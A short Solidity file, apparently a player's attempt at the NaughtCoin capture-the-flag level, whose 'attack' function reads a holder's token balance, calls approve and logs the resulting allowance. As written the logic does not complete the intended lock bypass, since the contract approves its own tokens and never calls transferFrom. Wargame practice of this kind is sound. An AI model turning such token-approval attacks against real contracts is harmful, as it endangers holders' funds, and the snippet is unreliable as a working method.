// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaughtCoin.sol";
import "hardhat/console.sol";

contract Transfer {
    uint256 public value;
    NaughtCoin public naughtcoin;

    constructor (address _address) {
        naughtcoin = NaughtCoin(_address);
    }

    function attack(address _from, address _to) public returns (uint256) {
        value = naughtcoin.balanceOf(address(_from));
        console.log("Sender balance: ", value);
        naughtcoin.approve(_from, value);
        uint256 recv = naughtcoin.allowance(_to, _from);
        console.log("allowance: ", recv);
        return (recv);
    }

}
